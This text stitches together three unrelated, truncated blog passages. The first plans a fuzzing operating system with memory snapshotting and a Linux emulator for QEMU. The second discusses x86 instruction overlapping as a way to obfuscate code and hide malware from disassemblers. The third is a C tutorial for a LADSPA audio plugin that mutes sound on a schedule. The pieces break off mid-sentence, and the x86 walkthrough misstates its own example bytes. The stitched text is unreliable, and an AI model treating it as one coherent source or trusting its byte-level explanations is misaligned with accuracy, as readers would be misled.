<p>We’re gonna need to write ACPI table parsers such that we can find the NUMA locality of memory and CPUs on the system. This will be critical to getting a high performance memory manager that scales with cores.</p>

<h3 id="multi-processing">Multi-processing</h3>

<p>Of course, the kernel will support multiple cores, as otherwise it’s kinda useless for compute.</p>

<h3 id="10gbit-networking--tcp-stack">10gbit networking + TCP stack</h3>

<p>Since I never work with disks, I’m going to follow my standard model of just using the network as general purpose whatever. To do this, we’ll need 10gbit network drivers and a TCP stack such that we can communicate with the rest of a network. Nothing too crazy here, we’ll probably borrow some code from <a href="https://github.com/gamozolabs/chocolate_milk">Chocolate Milk</a></p>

<hr>

<h2 id="interesting-stuff">Interesting stuff</h2>

<p>Okay, that stuff was boring, lets talk about the fun parts!</p>

<h3 id="exotic-memory-model">Exotic memory model</h3>

<p>Since we’ll be “snapshotting” memory itself, we need to make sure things like pointers aren’t a problem. The fastest, easiest, and best solution to this, is simply to make sure the memory always gets loaded at the same address. This is no problem for a single core, but it’s difficult for multiple cores, as they need to have copies of the same data mapped at the same location.</p>

<p>What’s the solution? Well of course, we’ll have every single core on the system running it’s own address space. This means there is no shared memory between cores (with some very, very minor execeptions). Not only does this lead to execeptionally high memory access performance (due to caches only being in the exclusive or shared states), but it also means that shared (mutable) memory will not be a thing! This means that we’ll do all of our core synchronization through message passing, which is higher latency in the best case than shared memory models, but with an advantage of scaling much better. As long as our messages can be serialized to TCP streams, that means we can scale across the network without any effort.</p>

<p>This has some awesome properties since we no longer need any locks to our page tables to add and remove entries, nor do we need to perform any TLB shootdowns, which can cost tens thousands of cycles.</p>

<p>I used this model in <a href="https://gamozolabs.github.io/metrology/2019/08/19/sushi_roll.html">Sushi Roll</a>, and I really miss it. It had incredibly good performance properties and forced a bit more thought about sharing information between cores.</p>

<h3 id="scaling">Scaling</h3>

<p>As with most things I write, linear scaling will be required, and scaling across the network is just implied, as it’s required for really any realistic application of fuzzing.</p>

<h3 id="fast-and-differential-memory-snapshotting">Fast and differential memory snapshotting</h3>

<p>So far, none of these things are super interesting. I’ve had many OSes that do these things well, for fuzzing, for quite a long time. However, I’ve never made these memory management techniques into a true data structure, rather I use them as needed manually. I plan to make the core of this operating system, a combination of Rust procedural macros and virtual memory management tricks to allow for arbitrary data structure to be stored in a tree-shaped checkpointed structure.</p>

<p>This will allow for fast transitions between different state of the structure as they were snapshotted. This will be done by leveraging the dirty bits in the page tables, and creating an allocator that will allocate in a pool of memory which will be saved and restored on snapshots. This memory will be treated as an opaque blob internally, and thus it can hold any information you want, device state, guest memory state, register state, something completely unrelated to fuzzing, won’t matter. To handle nested structures (or more specifically, pointers in structures which are to be tracked), we’ll use a Rust procedural macro to disallow untracked pointers within tracked structures.</p>

<p>Effectively, we’re going to heavily leverage the hardware’s MMU to differentally snapshot, teleport between, and restore blobs of memory. For fuzzing, this is necessary as a way to hold guest memory state and register state. By treating this opaquely, we can focus on doing the MMU aspects really well, and stop worrying about special casing all these variables that need to be restored upon resets.</p>

<h3 id="linux-emulator">Linux emulator</h3>

<p>Okay, so all of that is kinda to make room for developing high performance fuzzers. In my case, I want this mainly for a new rewrite of vectorized emulation, but to make it interesting for others, we’re going to implement a Linux emulator capable of running QEMU.</p>

<p>This means that we’ll be able to (probably staticially only) compile QEMU. Then we can take this binary, and load it into our OS and run QEMU in our OS. This means we can control the syscall responses to the requests QEMU makes. If we do this deterministically (we will), this means QEMU will be deterministic. Which thus means, the guest inside of QEMU will also be deterministic. You see? This is a technique I’ve used in the past, and works exceptionally well. We’ll definitely outperform Linux’s handling of syscalls, and we’ll scale better, and we’ll blow Linux away when it comes to memory management.</p>

<h3 id="kvm-emulator--hypervisor">KVM emulator + hypervisor</h3>

<p>So, I have no idea how hard this would be, but from about 5 minutes of skimming the interwebs, it seems that I could pretty easily write a hypervisor in my OS that emulates KVM ioctls. Meaning QEMU would just think KVM is there, and use it!</p>

<p>This will give us full control of QEMU’s determinism, syscalls, performance, and reset speeds… without actually having to modify QEMU code.</p>

<h2 id="thats-it">That’s it</h2>

<p>So that’s the plan. An OS + fast MMU code + hypervisor + Linux emulator, to allow us to deterministically run anything QEMU can run, which is effectively everything. We’ll do this with performance likely into the millions of VM resets per second per core, scaling linearly with cores, including over the network, to allow some of the fastest general purpose fuzzing the world has ever seen :D</p>

<h2 id="faq">FAQ</h2>

<p>Some people have asked questions on the internet, and I’ll post them here:</p>

<h3 id="hackernews-q1">Hackernews Q1</h3>

<p>Q:</p>

<div><div><pre><code>Huh. So my initial response was, "why on earth would you need a whole OS for that", but memory snapshotting and improved virtual memory performance might actually be a good justification. Linux does have CRIU which might be made to work for such a purpose, but I could see a reasonable person preferring to do it from a clean slate. On the other hand, if you need qemu to run applications (which I'm really unclear about; I can't tell if the plan is to run stuff natively on this OS or just to provide enough system to run qemu and then run apps on linux on qemu) then I'm surprised that it's not easier to just make qemu do what you want (again, I'm pretty sure qemu already has its own memory snapshotting features to build on).

Of course, writing an OS can be its own reward, too:) 
</code></pre></div></div>

<p>A:</p>

<div><div><pre><code>Oooh, wasn't really expecting this to make it to HN cause it was meant to be more of an announcement than a description.

But yes, I've done about 7 or 8 operating systems for fuzzing in the past and it's a massive performance (and cleanliness) cleanup. This one is going to be like an operating system I wrote 2-3 years ago for my vectorized emulation work.

To answer your QEMU questions, the goal is to effectively build QEMU with MUSL (just to make it static so I don't need a dynamic loader), and modify MUSL to turn all syscalls to `call` instructions. This means a "syscall" is just a call to another area, which will by my Rust Linux emulator. I'll implement the bare minimum syscalls (and enum variants to those syscalls) to get QEMU to work, nothing more. The goal is not to run Linux applications, but run a QEMU+MUSL combination which may be modified lightly if it means a lower emulation burden …</code></pre></div></div></div></article></div></div></div>

  <div itemprop="articleBody">
    
<p>Computer programs comes in all shapes and sizes, but one of the most important form is x86 binary executables. These files can be read by an x86 CPU and will alter the CPU  state in some way. Much effort has gone into how we represent these binaries, like making them smaller so that they execute faster. But also much effort has gone into making them harder the read when decompiled, aka being turned back from binary into human-readable text. People do this to for instance protect intellectual property, but also to hide malicious code. It is vital for us thus to understand all forms of which is possible to get both the optimization and to defend ourselves against malicious actors.</p>

<p>One still completely undiscovered is that of binary overlapping. Where the same byte sequence can be interpreted as multiple programs if you start parsing with just one byte off. The key distinction that we do not start parsing at the start of a different instruction, but always somewhere in the middle, and keeping it that way for as long as possible.</p>

<p>When an x86 CPU executes a program, a pointer points towards a sequence of bytes.
The CPU will read these a byte at a time until the CPU recognizes the instruction and it will execute it.
After execution is done, it will continue reading bytes until it recognizes an instruction repeating this process.
The CPU’s today will not strictly adhere to this model anymore and it might execute/parse instructions in advance under the hood already, but it still has to guarantee this model works. We will also consider this model because other software like disassemblers typically works this way.</p>

<p>In x86, instructions are by definition anywhere between 1-15 bytes long, they follow a complex encoding scheme which we will ignore for now. 
Furthermore, the word “instruction” is a little bit ambiguous, since it can refer to</p>
<ol>
  <li>the mnemonic, i.e ADD</li>
  <li>the assembler form: i.e ADD rax, 2</li>
  <li>the binary encoding, i.e for ADD that might be 0x10 0x34.</li>
</ol>

<p>And a program is a simple list of instructions.</p>

<p>So let us dive into the good stuff!</p>

<p>Consider the binary following binary sequence. The lines are separated on an instruction level basis. The values in hexadecimal are displayed to the left, and the corresponding assembler form to the right.</p>

<div><div><pre><code>0f 0d c0        NOP EAX, EAX
90              NOP
90              NOP
31  ff          XOR EDI, EDI
</code></pre></div></div>

<p>If executed by the CPU, it will first read the byte <code>0f</code>, this doesn’t mean anything yet. So we will parse a second byte, <code>c0</code>. Still nothing, then we read <code>d0</code> and we get a specified instruction. In this case <code>NOP EAX, EAX</code>. Best described as “No OPeration executed with register EAX and EAX”.</p>

<p>Afterward, we read two <code>NOP</code>s and a <code>XOR</code> instruction that <code>XOR</code>s both its inputs. Hence zeroing out all content.</p>

<p>What this program does is not that interesting. After all, it does nothing for a bit and then only zero’s out an register. But after 3 years this is the most beautiful program I could think of.</p>

<p>First things first, why do we execute the same operation for the byte sequence <code>0f 0d c0</code> as for <code>90</code>. How is it possible that two byte-sequences that share not a single byte represent the same instruction?</p>

<p>If we look up <code>0f 0d c0</code> in the x86 instruction set manual, we can see that it is an instruction for prefetching hints. So it should not affect the state on the CPU (or at least observable to us). Hence the disassembler in which I generated this output decided it was equivalent to a NOP and should be displayed as such.</p>

<p>However, this above piece of code is only disassembled like that because I threw it inside a proper disassembler (intel’s XED in this case). Let’s take a look at the output of an arguably more well-known disassembler, objdump.</p>

<div><div><pre><code>0f                      prefetch (bad)
0d c0 90 90 31          or     $0x319090c0,%eax
....
</code></pre></div></div>

<p>Three interesting things happened here, first of all, it didn’t decode it correctly. Which isn’t too uncommon even in mainstream disassemblers if you start hunting for it[0]. 
The second interesting thing that happened is that we suddenly obtained a totally new instruction that we have not seen before by starting execution/parsing one byte later, while still using the same original byte sequence!</p>

<p>But most importantly of all, <em>what is the next executed instruction</em>?
We know it is should be the next byte in the stream, so looking at the first output: here we can see it should start with <em>FF</em>.</p>

<p>If we would continue this, we would have to completely independent programs inside the same original binary sequence!</p>



<p>This technique has 2 very interesting use-cases. The original use-case, and the reason why I came up with this idea, is obfuscation. 
Notice that in the second output, the output of the disassembler objdump, can now theoretically be <em>completely different</em> program from what another actor, like your CPU, could read. Implying that malware can be completely hidden from malware analysis or automatic analysis tools without <em>any</em> overhead. Only by exploiting a single parsing error. Which can be guaranteed against most common disassembler parsing techniques (this will the topic of another blog).</p>

<p>The second and probably more exciting use case is performance.
In the examples above we didn’t give that much thought on what the programs are or are supposed to look like.</p>

<p>But let us consider a program P. If we take the second half of P, and we were magically able to alter the first half of P such that its functionality would be retained, and that if you would start parsing from the second byte it would execute the second half of the original P. Then we have effectively halved our program size! And we could continue doing this until we have reduced it by a massive factor.</p>


<p>If we consider binary sequence, we say they are binary overlapping, if and only if, we can obtain a program P<sup>1</sup> and P<sup>2</sup> such that</p>
<ol>
  <li>To execute P<sup>1</sup>, we start executing at a different byte in the byte sequence than for P<sup>2</sup></li>
  <li>For each instruction in P<sup>1</sup>, no instruction ends with the same byte index in the sequence as any other in P<sup>2</sup></li>
</ol>

<p>The first property is to ensure we talk about programs that are obtained by starting at a different location than another.</p>

<p>The second property is there to stop them from converging. If this property wasn’t satisfied, any 2 different programs would converge into the same from that point onwards, example:</p>

<div><div><pre><code>ff c5                   inc    ebp
fc                      cld
77 90                   ja     0xffffffffffffff95
90                      nop             &lt;- same as the second stream
...
...
</code></pre></div></div>

<div><div><pre><code>c5 fc 77                vzeroall
90                      nop
90                      nop             &lt;- same as the first stream
...
...
</code></pre></div></div>

<h2 id="obtaining-these-binaries">Obtaining these binaries</h2>
<p>We have 3 options that I’m aware of for obtaining these binaries.
We can write these binaries by hand, this is, of course, no option besides for very specialized cases and probably not worth it.</p>

<p>The second option is by trying to alter the generation process of our compiler/assembler.
Computationally generating binaries like this is heavy and our current tooling is not designed to support generating these binaries.</p>

<h3 id="compiler-generation">Compiler Generation</h3>

<p>Let me illustrate the complexity with the following example: 
Suppose we have 2 programs P<sup>1</sup> and P<sup>2</sup>, which we want to overlap. Meaning that the first byte of P<sup>2</sup> should be the second byte of P<sup>1</sup>.
Consider that P<sup>1</sup> is a simple program that wants to first execute an <code>add</code> followed by a <code>mov</code>, while P<sup>2</sup> wants to execute an <code>xor</code> followed by a <code>jmp</code>. For brevities sake, I omitted possible arguments.</p>

<p>Our magical super awesome assembler would look at P<sup>1</sup>, recognizes that we should output a binary encoding for <code>add</code>. Now it would look up which bytes are defined to represent <code>add</code> and it would emit it to some structure. 
Let’s say for <code>add</code> the assembler emitted <code>10 AE</code>.</p>

<p>Now before we continue, we have to satisfy that P<sup>2</sup> also gets generated correctly. Unfortunately for us, the <code>xor</code> instruction is defined to be <code>06 84</code>.</p>

<p>In its current form, it seems as if <code>add</code> and <code>xor</code> are incompatible for binary overlapping.
Luckily for us, due to the incredibly complex nature, there is a large set of transformations that can help to remedy this situation.</p>

<p>For instance, it is not completely uncommon that an instruction has a different encoding. So while <code>add</code> was first defined to be <code>10 AE</code> at first, it might be the case that in the documentation an equivalent encoding exists for our use-case, so maybe we might substitute it with <code>30 06 84 20</code>. Enabling us to binary overlap at a cost of lengthening P compared to what we otherwise would.</p>

<p>So now we got <code>add</code> and <code>xor</code> to overlap. But now we run into the same problem for the second instruction for P<sup>1</sup>, our generated encoding for <code>mov</code> may now only start with <code>20</code>!</p>

<p>This means that chance of being able to satisfy the overlapping properties for instructions is <strong>incredibly</strong> small. 
Hence we need every help we can get through combining many different techniques, such that we get an acceptable rate of being able to produce our desired binaries.</p>

<h4 id="overview-of-generation-techniques">Overview of generation techniques</h4>
<p>Through the 3 years that I have been thinking about this problem, I accumulated a list of possible techniques:</p>

<ul>
  <li>use a semantically equivalent instruction, like changing <code>ADD 1</code> to <code>INC</code>remenent. Using <code>prefetchw</code> directives instead of <code>NOP</code>s.</li>
  <li>change an instruction encoding by using different prefixes or encoding mechanisms. If an instruction ends with <code>48</code>, we can simply prepend <code>48</code> to any instruction and it will be considered as a prefix. Guaranteeing overlap.</li>
  <li>re-order instructions before they get used like done in out-of-order execution</li>
  <li>alter an instruction, but appending the inverse of the change. i.e <code>ADD 2</code> would become <code>ADD 5</code> with <code>SUB 3</code> appended. This technique can also be used with memory locations but requires much more setup</li>
  <li>jumping ahead a few bytes S.T we can use later bytes instead of the current one in a given stream</li>
  <li>inserting nop’s or equivalents (or something like <code>add</code> and <code>sub</code> with the same argument). NOP’s are great since these can have long …</li></ul></div></article></div></div></div>

<p>Yesterday, I was looking for a way to add filters to my computer’s audio output and that’s when I met <strong>Linux Audio Developer’s Simple Plugin API</strong> aka <a href="https://www.ladspa.org/" target="_blank" rel="noopener">LADSPA</a>. My purpose was to do some post-processing on my computer’s audio output and it turned out the easiest way is to add a <strong>LADSPA</strong> sink to <strong>Pulseaudio</strong>. </p>
<p>The problem was I couldn’t find any <strong>LADSPA</strong> documentation. The <code>ladspa.h</code> header file and the examples in the <a href="http://www.ladspa.org/download/index.html" target="_blank" rel="noopener">LADSPA SDK</a> were the only sources to figure out how to use. They’re fine sources but if I could find a step-by-step explained example code, I’d have learned faster. So that’s how the idea of the infamous <strong>Annoying Mute Line</strong> plugin came out. Note that this tutorial doesn’t need an advanced <a href="https://en.wikipedia.org/wiki/Digital_signal_processing" target="_blank" rel="noopener">DSP</a> knowledge but you may need to read about <a href="https://en.wikipedia.org/wiki/Sampling_%28signal_processing%29" target="_blank" rel="noopener">sampling</a>.</p>
<h2 id="LADSPA-Basics"><a href="#LADSPA-Basics" title="LADSPA Basics"></a>LADSPA Basics</h2><p>Before moving into any code, let’s look at <strong>LADSPA</strong> basics. <strong>LADSPA</strong> is a very simple API, you just need to fill in a handler function and register it, and then the <strong>LADSPA</strong> host will call it every time it has some audio samples. </p>
<p>By the way, I want to explain what a <strong>LADSPA host</strong> is. A <strong>LADSPA host</strong> is a program that supports <strong>LADSPA</strong> plugins. You can see some of them <a href="https://wiki.linuxaudio.org/apps/categories/ladspa" target="_blank" rel="noopener">here</a>. <strong>Pulseaudio</strong> and <strong>ALSA</strong> are <strong>LADSPA</strong> hosts too.</p>
<p><strong>LADSPA</strong> has three main data types:</p>
<ul>
<li><p><code>Descriptor</code>: As you may understand from the name, it’s the descriptor of the plugin. It keeps handler function pointers, creator’s name, label, parameters, etc.</p>
</li>
<li><p><code>Port</code>: <em>Ports</em> are parameters of our plugin. We define our ports in the descriptor. </p>
</li>
<li><p><code>Handle</code>: This is our customized data type to track our algorithm’s state and is passed to our <code>run()</code> handler along with samples.</p>
</li>
</ul>
<p>It may be hard to understand why these data types are needed but it’ll get more clear later.</p>
<h2 id="Annoying-Mute-Line"><a href="#Annoying-Mute-Line" title="Annoying Mute Line"></a>Annoying Mute Line</h2><p>Now, the fun part. Let’s create an annoying plugin which mutes the output audio periodically for a specified amount of time. Later we may install this plugin into our friend’s machine and watch her eat her nails out of anger. Haha.</p>
<p>Our plugin should take two parameters, let’s say, <code>muteInterval</code> and <code>muteLength</code>. <code>muteInterval</code> is the time in seconds we’ll wait before we mute the audio, and <code>muteLength</code> is the time in seconds we’ll mute the audio for. To understand better, let’s listen to the little part of Isaac Asimov’s speech below:</p>


<p>If we apply our plugin to the audio with <code>muteInterval</code> be 2 seconds and <code>muteLength</code> be 1 second, we’ll get:</p>


<p>So you got the idea. Now, let’s dive into the code. If you haven’t installed <strong>LADSPA SDK</strong>, you may download it from <a href="http://www.ladspa.org/download/index.html" target="_blank" rel="noopener">here</a> or if you’re on <em>Ubuntu/Debian</em> just run:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>apt install ladspa-sdk</span><br></pre></td></tr></tbody></table></figure>

<p>Now, let’s define our handle:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span></span><br><span><span>#<span>define</span> MUTED   0</span></span><br><span><span>#<span>define</span> UNMUTED !MUTED</span></span><br><span></span><br><span></span><br><span><span>typedef</span> <span><span>struct</span> {</span></span><br><span>    <span>unsigned</span> <span>long</span> sampleRate;</span><br><span></span><br><span>    <span>unsigned</span> <span>int</span> muteInterval; </span><br><span>    <span>unsigned</span> <span>int</span> muteLength;   </span><br><span></span><br><span>    LADSPA_Data *inputBuffer; </span><br><span>    LADSPA_Data *outputBuffer; </span><br><span></span><br><span>    <span>unsigned</span> <span>long</span> remaining; </span><br><span>    <span>unsigned</span> <span>int</span> state; </span><br><span>} AnnoyingMuteLine;</span><br></pre></td></tr></tbody></table></figure>

<p>This is the <code>struct</code> we’ll track our code’s state. Variable names explain themselves but I just want to go over the <code>remaining</code> and <code>state</code> variable. We’ll have two states <code>MUTED</code> and <code>UNMUTED</code>. In <code>UNMUTED</code> state, we’ll just forward the sample we read from input buffer to output buffer. In <code>MUTED</code> state, we’ll ignore the sample from the input buffer and write <code>0.0</code> to the output buffer. To keep track of time, we use the <code>remaining</code> variable. Every time we write to the output buffer, we’ll decrement <code>remaining</code> by one. If <code>remaining</code> is zero, we’ll toggle the <code>state</code> variable. <code>remaining</code> is calculated every time we toggle the <code>state</code>. For <code>MUTED</code> state, <code>remaining</code> initializes as <code>muteLength x sampleRate</code> and for <code>UNMUTED</code> state, it initializes as <code>muteInterval x sampleRate</code>.</p>
<p>Since we have our handle defined, now, we can fill our handler functions. <strong>LADSPA</strong> has several handler functions named:</p>
<ul>
<li><code>instantiate</code></li>
<li><code>connect_port</code></li>
<li><code>activate</code></li>
<li><code>run</code></li>
<li><code>run_adding</code></li>
<li><code>set_run_adding_gain</code></li>
<li><code>deactivate</code></li>
<li><code>cleanup</code></li>
</ul>
<p>We won’t be using <code>run_adding</code> and <code>set_run_adding_gain</code> but you can find more information about them in <code>ladspa.h</code> file. Let’s start with <code>instantiate</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></pre></td><td><pre><span></span><br><span><span><span>static</span> LADSPA_Handle <span>instantiateMuteLine</span><span>(<span>const</span> LADSPA_Descriptor *descriptor,</span></span></span><br><span><span><span>                                      <span>unsigned</span> <span>long</span> sampleRate)</span> </span>{</span><br><span></span><br><span>    AnnoyingMuteLine *muteLine;</span><br><span></span><br><span>    muteLine = (AnnoyingMuteLine *)<span>malloc</span>(<span>sizeof</span>(AnnoyingMuteLine));</span><br><span></span><br><span>    <span>if</span> (muteLine == <span>NULL</span>) {</span><br><span>        <span>return</span> <span>NULL</span>;</span><br><span>    }</span><br><span></span><br><span>    muteLine-&gt;sampleRate = sampleRate;</span><br><span></span><br><span>    <span>return</span> muteLine;</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>This is where we create our handle and return it to the <strong>LADSPA</strong> host. It’s like a new instance of our plugin is created. Here in the code we just set the sample rate given by our host in our handle. Note that <code>LADSPA_Handle</code> is of type <code>void *</code> so we can provide it any type we want.</p>
<p><code>connect_port</code> handler is next:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span></span><br><span><span>#<span>define</span> PORT_COUNT       4</span></span><br><span><span>#<span>define</span> ML_MUTE_INTERVAL 0</span></span><br><span><span>#<span>define</span> ML_MUTE_LENGTH   1</span></span><br><span><span>#<span>define</span> ML_INPUT         2</span></span><br><span><span>#<span>define</span> ML_OUTPUT        3</span></span><br><span></span><br><span></span><br><span><span><span>static</span> <span>void</span> <span>connectPort</span><span>(LADSPA_Handle handle, <span>unsigned</span> <span>long</span> port, LADSPA_Data *data)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *) handle;</span><br><span></span><br><span>    <span>switch</span> (port) {</span><br><span>    <span>case</span> ML_MUTE_INTERVAL:</span><br><span>        muteLine-&gt;muteInterval = (<span>unsigned</span> <span>int</span>)*data;</span><br><span>        <span>break</span>;</span><br><span>    <span>case</span> ML_MUTE_LENGTH:</span><br><span>        muteLine-&gt;muteLength = (<span>unsigned</span> <span>int</span>)*data;</span><br><span>        <span>break</span>;</span><br><span>    <span>case</span> ML_INPUT:</span><br><span>        muteLine-&gt;inputBuffer = data;</span><br><span>        <span>break</span>;</span><br><span>    <span>case</span> ML_OUTPUT:</span><br><span>        muteLine-&gt;outputBuffer = data;</span><br><span>        <span>break</span>;</span><br><span>    }</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Here we have four ports. You can think of it as we have four parameters. In this function, our host is providing us parameters so that we can set them in our handle. <strong>LADSPA</strong> says that <code>connect_port</code> handler will be called for each port but to support real-time changes, it may be called more than that. We’ll tell the parameter ids to our host later when we register our descriptor.</p>
<p>Now, let’s implement <code>activate</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span></span><br><span><span><span>static</span> <span>void</span> <span>activateMuteLine</span><span>(LADSPA_Handle handle)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *)handle;</span><br><span></span><br><span>    muteLine-&gt;state = MUTED;</span><br><span>    muteLine-&gt;remaining = <span>0</span>;</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Here is the activation of our instance. We set the state as <code>MUTED</code> and <code>remaining</code> as <code>0</code> so when our <code>run</code> handler is called, we can immediately toggle our state since there aren’t any remaining samples for the <code>MUTED</code> state. The difference between <code>activate</code> and <code>instantiate</code> is that <code>instantiate</code> is like creating an instance and <code>activate</code> is called on that instance. Our host may call <code>activate</code> and <code>deactivate</code> many times after calling <code>instantiate</code>.</p>
<p>Aaand <code>run</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span></span><br><span><span><span>static</span> <span>void</span> <span>runMuteLine</span><span>(LADSPA_Handle handle, <span>unsigned</span> <span>long</span> sampleCount)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *) handle;</span><br><span></span><br><span>    <span>for</span> (<span>unsigned</span> <span>long</span> i = <span>0</span>; i &lt; sampleCount; i++) {</span><br><span>        <span>if</span> (muteLine-&gt;remaining == <span>0</span>) {</span><br><span>            muteLine-&gt;state = !muteLine-&gt;state;</span><br><span></span><br><span>            <span>if</span> (muteLine-&gt;state == MUTED) {</span><br><span>                muteLine-&gt;remaining = muteLine-&gt;sampleRate * muteLine-&gt;muteLength;</span><br><span>            }</span><br><span>            <span>else</span> {</span><br><span>                muteLine-&gt;remaining = muteLine-&gt;sampleRate * muteLine-&gt;muteInterval;</span><br><span>            }</span><br><span>        }</span><br><span></span><br><span>        <span>if</span> (muteLine-&gt;state == MUTED) {</span><br><span>            muteLine-&gt;outputBuffer[i] = <span>0</span>;</span><br><span>        }</span><br><span>        <span>else</span> {</span><br><span>            muteLine-&gt;outputBuffer[i] = muteLine-&gt;inputBuffer[i];</span><br><span>        }</span><br><span></span><br><span>        muteLine-&gt;remaining--;</span><br><span>    }</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Here, our host provides us the sample count written to the input buffer and the handle. For every sample, we apply the logic described under the definition of <code>AnnoyingMuteLine</code>. Nothing more.</p>
<p>Last of all, let’s implement <code>cleanup</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span><span>static</span> <span>void</span> <span>cleanupMuteLine</span><span>(LADSPA_Handle handle)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *) handle;</span><br><span></span><br><span>    <span>free</span>(handle);</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Nothing much has been done here. We’ve just removed our handle from memory.</p>
<p>We’ve completed the implementations of our handler functions. Now, let’s implement the <code>init()</code> function and register our descriptor in it. <code>init()</code> will be called when our plugin is loaded into memory.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br></pre></td><td><pre><span><span>static</span> LADSPA_Descriptor *descriptor = <span>NULL</span>;</span><br><span></span><br><span></span><br><span><span>static</span> <span>void</span> __attribute__ ((constructor)) init() {</span><br><span>    LADSPA_PortDescriptor * portDescriptors;</span><br><span>    LADSPA_PortRangeHint * portRangeHints;</span><br><span>    <span>char</span> ** portNames;</span><br><span></span><br><span>    descriptor = (LADSPA_Descriptor *)<span>malloc</span>(<span>sizeof</span>(LADSPA_Descriptor));</span><br><span></span><br><span>    <span>if</span> (!descriptor) {</span><br><span>        <span>return</span>;</span><br><span>    }</span><br><span></span><br><span>    descriptor-&gt;UniqueID  = <span>1094</span>; </span><br><span>    descriptor-&gt;Label     = strdup(<span>"mute_n"</span>);</span><br><span>    descriptor-&gt;Name      = strdup(<span>"Annoying Mute Line"</span>);</span><br><span>    descriptor-&gt;Maker     = strdup(<span>"paddlesteamer"</span>);</span><br><span>    descriptor-&gt;Copyright = strdup(<span>"None"</span>);</span><br><span></span><br><span>    descriptor-&gt;Properties = LADSPA_PROPERTY_HARD_RT_CAPABLE;</span><br><span></span><br><span>    descriptor-&gt;PortCount = PORT_COUNT;</span><br><span>    </span><br><span>    portDescriptors = (LADSPA_PortDescriptor *) <span>calloc</span>(PORT_COUNT, <span>sizeof</span>(LADSPA_PortDescriptor));</span><br><span></span><br><span>    portDescriptors[ML_MUTE_INTERVAL] = LADSPA_PORT_INPUT | LADSPA_PORT_CONTROL;</span><br><span>    portDescriptors[ML_MUTE_LENGTH] = LADSPA_PORT_INPUT | LADSPA_PORT_CONTROL;</span><br><span>    portDescriptors[ML_INPUT] = LADSPA_PORT_INPUT | LADSPA_PORT_AUDIO;</span><br><span>    portDescriptors[ML_OUTPUT] = LADSPA_PORT_OUTPUT | LADSPA_PORT_AUDIO;</span><br><span></span><br><span>    descriptor-&gt;PortDescriptors = portDescriptors;</span><br><span></span><br><span>    portNames = (<span>char</span> **) <span>calloc</span>(PORT_COUNT, <span>sizeof</span>(<span>char</span> *));</span><br><span>    portNames[ML_MUTE_INTERVAL] = strdup(<span>"Interval in seconds"</span>);</span><br><span>    portNames[ML_MUTE_LENGTH] = strdup(<span>"Mute length in seconds"</span>);</span><br><span>    portNames[ML_INPUT] = strdup(<span>"Input"</span>);</span><br><span>    portNames[ML_OUTPUT] = strdup(<span>"Output"</span>);</span><br><span></span><br><span>    descriptor-&gt;PortNames = (<span>const</span> <span>char</span> * <span>const</span> *) portNames;</span><br><span></span><br><span>    portRangeHints = (LADSPA_PortRangeHint *) <span>calloc</span>(PORT_COUNT, <span>sizeof</span>(LADSPA_PortRangeHint));</span><br><span></span><br><span>    portRangeHints[ML_MUTE_INTERVAL].HintDescriptor = LADSPA_HINT_BOUNDED_BELOW | 